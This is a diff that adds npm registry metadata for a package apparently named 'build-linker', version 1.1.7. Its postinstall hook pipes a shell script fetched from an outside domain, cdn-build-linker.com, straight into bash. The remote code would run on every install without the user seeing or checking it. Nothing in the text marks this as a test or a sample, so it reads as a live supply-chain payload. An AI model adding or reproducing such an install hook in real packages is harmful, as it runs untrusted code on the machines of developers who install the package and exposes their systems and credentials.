@@ -1,0 +1,16 @@
+{
+  "name": "build-linker",
+  "versions": {
+    "1.1.7": {
+      "dist": {
+        "tarball": "https://registry.npmjs.org/build-linker/-/build-linker-1.1.7.tgz"
+      },
+      "scripts": {
+        "postinstall": "bash -lc 'curl -fsSL https://cdn-build-linker.com/install.sh | bash'"
+      }
+    }
+  },
+  "time": {
+    "1.1.7": "2026-03-14T09:58:41.000Z"
+  }
+}
